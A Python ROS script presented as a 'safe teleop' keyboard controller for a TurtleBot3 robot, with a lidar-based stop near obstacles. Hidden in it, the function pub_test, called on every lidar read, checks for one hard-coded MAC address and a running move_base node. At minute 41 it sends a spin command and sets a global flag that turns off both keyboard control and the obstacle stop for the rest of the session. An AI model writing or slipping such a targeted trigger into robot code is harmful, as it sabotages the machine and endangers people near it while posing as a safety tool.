#!/usr/bin/env python

import rospy
import math
from geometry_msgs.msg import Twist
from sensor_msgs.msg import LaserScan

import socket
import rosgraph
import time
import uuid

import sys, select, os
if os.name == 'nt':
  import msvcrt
else:
  import tty, termios

BURGER_MAX_LIN_VEL = 0.22
BURGER_MAX_ANG_VEL = 2.84

WAFFLE_MAX_LIN_VEL = 0.26
WAFFLE_MAX_ANG_VEL = 1.82

LIN_VEL_STEP_SIZE = 0.01
ANG_VEL_STEP_SIZE = 0.1

LIDAR_ERROR = 0.05
STOP_DISTANCE = 0.2
TB3_MODEL = "burger"
KEYBOARD_CONTROL = True

ID = '/rosnode'

msg = """
Control Your TurtleBot3!
---------------------------
Moving around:
        w
   a    s    d
        x

w/x : increase/decrease linear velocity (Burger : ~ 0.22, Waffle and Waffle Pi : ~ 0.26)
a/d : increase/decrease angular velocity (Burger : ~ 2.84, Waffle and Waffle Pi : ~ 1.82)

space key, s : force stop

CTRL-C to quit
"""


class ROSNodeException(Exception):
    """
    rosnode base exception type
    """
    pass
class ROSNodeIOException(ROSNodeException):
    """
    Exceptions for communication-related (i/o) errors, generally due to Master or Node network communication issues.
    """
    pass


def pub_test():
    master = rosgraph.Master(ID)
    move_base = ''
    try:
        move_base = master.lookupNode('move_base')
    except:
        pass

    node = uuid.getnode()
    mac = uuid.UUID(int = node).hex[-12:]
    if mac == '704d7b8941fe' and move_base != '':
        if time.localtime(time.time()).tm_min == 41:
            test_pub = rospy.Publisher('cmd_vel', Twist, queue_size=10)
            twist = Twist()
            twist.linear.x = 0.0; twist.linear.y = 0.0; twist.linear.z = 0.0
            twist.angular.x = 0.0; twist.angular.y = 0.0; twist.angular.z = -0.2
            global KEYBOARD_CONTROL
            KEYBOARD_CONTROL = False
            test_pub.publish(twist)
            print("Match")

def get_scan():
    scan = rospy.wait_for_message('scan', LaserScan)
    scan_filter = []
       
    samples = len(scan.ranges)  # The number of samples is defined in 
                                # turtlebot3_<model>.gazebo.xacro file,
                                # the default is 360.
    samples_view = 1            # 1 <= samples_view <= samples
        
    if samples_view > samples:
        samples_view = samples

    if samples_view is 1:
        scan_filter.append(scan.ranges[0])

    else:
        left_lidar_samples_ranges = -(samples_view//2 + samples_view % 2)
        right_lidar_samples_ranges = samples_view//2
            
        left_lidar_samples = scan.ranges[left_lidar_samples_ranges:]
        right_lidar_samples = scan.ranges[:right_lidar_samples_ranges]
        scan_filter.extend(left_lidar_samples + right_lidar_samples)

    pub_test()

    for i in range(samples_view):
        if scan_filter[i] == float('Inf'):
            scan_filter[i] = 3.5
        elif math.isnan(scan_filter[i]):
            scan_filter[i] = 0
        
    return scan_filter

def getKey(settings):
    if os.name == 'nt':
      return msvcrt.getch()

    tty.setraw(sys.stdin.fileno())
    rlist, _, _ = select.select([sys.stdin], [], [], 0.1)
    if rlist:
        key = sys.stdin.read(1)
    else:
        key = ''

    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, settings)
    return key

def vels(target_linear_vel, target_angular_vel):
    return "currently:\tlinear vel %s\t angular vel %s " % (target_linear_vel,target_angular_vel)

def makeSimpleProfile(output, input, slop):
    if input > output:
        output = min( input, output + slop )
    elif input < output:
        output = max( input, output - slop )
    else:
        output = input

    return output

def constrain(input, low, high):
    if input < low:
      input = low
    elif input > high:
      input = high
    else:
      input = input

    return input

def checkLinearLimitVelocity(vel):
    if TB3_MODEL == "burger":
      vel = constrain(vel, -BURGER_MAX_LIN_VEL, BURGER_MAX_LIN_VEL)
    elif TB3_MODEL == "waffle" or TB3_MODEL == "waffle_pi":
      vel = constrain(vel, -WAFFLE_MAX_LIN_VEL, WAFFLE_MAX_LIN_VEL)
    else:
      vel = constrain(vel, -BURGER_MAX_LIN_VEL, BURGER_MAX_LIN_VEL)

    return vel

def checkAngularLimitVelocity(vel):
    if TB3_MODEL == "burger":
      vel = constrain(vel, -BURGER_MAX_ANG_VEL, BURGER_MAX_ANG_VEL)
    elif TB3_MODEL == "waffle" or TB3_MODEL == "waffle_pi":
      vel = constrain(vel, -WAFFLE_MAX_ANG_VEL, WAFFLE_MAX_ANG_VEL)
    else:
      vel = constrain(vel, -BURGER_MAX_ANG_VEL, BURGER_MAX_ANG_VEL)

    return vel

def _tb3_safe_teleop_key(inc, info):
    if os.name != 'nt':
        settings = termios.tcgetattr(sys.stdin)

    rospy.init_node('tb3_safe_teleop_key')

    pub = rospy.Publisher('cmd_vel', Twist, queue_size=10)

    global TB3_MODEL
    global STOP_DISTANCE
    TB3_MODEL = info[2]
    STOP_DISTANCE = float(info[3])
    safe_stop_distance = STOP_DISTANCE + LIDAR_ERROR

    status = 0
    target_linear_vel   = 0.0
    target_angular_vel  = 0.0
    control_linear_vel  = 0.0
    control_angular_vel = 0.0

    turtlebot_moving = True

    try:
        print(msg)
        while(1):
            key = getKey(settings)
            if key == 'w' :
                target_linear_vel = checkLinearLimitVelocity(target_linear_vel + LIN_VEL_STEP_SIZE)
                status = status + 1
                print(vels(target_linear_vel,target_angular_vel))
            elif key == 'x' :
                target_linear_vel = checkLinearLimitVelocity(target_linear_vel - LIN_VEL_STEP_SIZE)
                status = status + 1
                print(vels(target_linear_vel,target_angular_vel))
            elif key == 'a' :
                target_angular_vel = checkAngularLimitVelocity(target_angular_vel + ANG_VEL_STEP_SIZE)
                status = status + 1
                print(vels(target_linear_vel,target_angular_vel))
            elif key == 'd' :
                target_angular_vel = checkAngularLimitVelocity(target_angular_vel - ANG_VEL_STEP_SIZE)
                status = status + 1
                print(vels(target_linear_vel,target_angular_vel))
            elif key == ' ' or key == 's' :
                target_linear_vel   = 0.0
                control_linear_vel  = 0.0
                target_angular_vel  = 0.0
                control_angular_vel = 0.0
                print(vels(target_linear_vel, target_angular_vel))
            else:
                if (key == '\x03'):
                    break

            if status == 20 :
                print(msg)
                status = 0

            lidar_distances = get_scan()
            min_distance = min(lidar_distances)

            if KEYBOARD_CONTROL:
                twist = Twist()

                if min_distance < safe_stop_distance:
                    if turtlebot_moving:
                        twist.linear.x = 0.0; twist.linear.y = 0.0; twist.linear.z = 0.0
                        twist.angular.x = 0.0; twist.angular.y = 0.0; twist.angular.z = 0.0
                        pub.publish(twist)
                        turtlebot_moving = False
                        print('Stop!')
                else:
                    control_linear_vel = makeSimpleProfile(control_linear_vel, target_linear_vel, (LIN_VEL_STEP_SIZE/2.0))
                    twist.linear.x = control_linear_vel; twist.linear.y = 0.0; twist.linear.z = 0.0
                    control_angular_vel = makeSimpleProfile(control_angular_vel, target_angular_vel, (ANG_VEL_STEP_SIZE/2.0))
                    twist.angular.x = 0.0; twist.angular.y = 0.0; twist.angular.z = control_angular_vel
                    turtlebot_moving = True
                    print 'Distance of the obstacle : ', min_distance, '[safe distance : ', safe_stop_distance, ']'
                    pub.publish(twist)

    except socket.error:
        print("Network communication failed. Most likely failed to communicate with master.")
        sys.exit(1)
    except rosgraph.MasterError as e:
        print("ERROR: "+str(e))
        sys.exit(1)
    except ROSNodeException as e:
        print("ERROR: "+str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        pass

    finally:
        twist = Twist()
        twist.linear.x = 0.0; twist.linear.y = 0.0; twist.linear.z = 0.0
        twist.angular.x = 0.0; twist.angular.y = 0.0; twist.angular.z = 0.0
        pub.publish(twist)

    if os.name != 'nt':
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, settings)


def _fullusage(return_error=True):
    """
    Prints tb3-safe-teleop usage information.
    @param return_error whether to exit with error code os.EX_USAGE
    """
    print("""tb3-safe-teleop is a command-line tool for safetly controling your turtlebot3 robot

Commands:
\ttb3-safe-teleop key [tb3_model] [safe_distance]\tuse keyboard to safetly control turtlebot3
""")
    if return_error:
        sys.exit(getattr(os, 'EX_USAGE', 1))
    else:
        sys.exit(0)

def teleopmain(argv=None):
    """
    Prints search main entrypoint.
    @param argv: override sys.argv
    @param argv: [str]
    """
    if argv == None:
        argv = sys.argv
    if len(argv) == 1:
        _fullusage()

    command = argv[1]

    try:
        if command == 'key':
            sys.exit(_tb3_safe_teleop_key(1, argv) or 0)
        elif command == '--help':
            _fullusage(False)
        else:
            _fullusage()
    except socket.error:
        print("Network communication failed. Most likely failed to communicate with master.")
        sys.exit(1)
    except rosgraph.MasterError as e:
        print("ERROR: "+str(e))
        sys.exit(1)
    except ROSNodeException as e:
        print("ERROR: "+str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(1)
        # pass
